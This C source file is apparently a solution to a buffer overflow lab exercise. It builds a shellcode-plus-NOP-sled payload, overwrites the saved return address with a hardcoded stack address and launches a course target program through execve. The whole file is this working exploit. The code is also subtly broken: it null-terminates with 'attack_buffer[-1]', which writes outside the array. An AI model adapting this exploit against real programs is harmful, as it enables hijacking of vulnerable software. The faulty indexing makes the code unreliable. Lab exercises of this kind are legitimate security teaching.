#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"

#define BUFFER_SIZE 353 // saved rip - &buf
#define BUFFER_ADDR 0x0000000040a4fd70 // &buf

int
main ( int argc, char * argv[] )
{
    char *    args[3];
    char *    env[1];

    // Create the attack buffer
    char attack_buffer[BUFFER_SIZE + 1];

    // Place the shell code at the front
    int i;
    for (i = 0; i < strlen(shellcode); ++i) {
        attack_buffer[i] = shellcode[i];
    }

    // Fill in with NOPs
    // Note that we cannot pad with BUFFER_ADDR because there are nulls in the BUFFER_ADDR
    for (; i < BUFFER_SIZE - 9; ++i) {
        attack_buffer[i] = 0x90;
    }

    // Overwrite the return address. 
    long *addr_ptr = (long *)(attack_buffer+i);
    *addr_ptr = BUFFER_ADDR;

    // The string should end with null
    attack_buffer[-1] = '\0';

    // Fill in the parameters
    args[0] = TARGET;
    args[1] = attack_buffer;
    args[2] = NULL;

    env[0] = NULL;

    if ( execve (TARGET, args, env) < 0 )
        fprintf (stderr, "execve failed.\n");

    return (0);
}
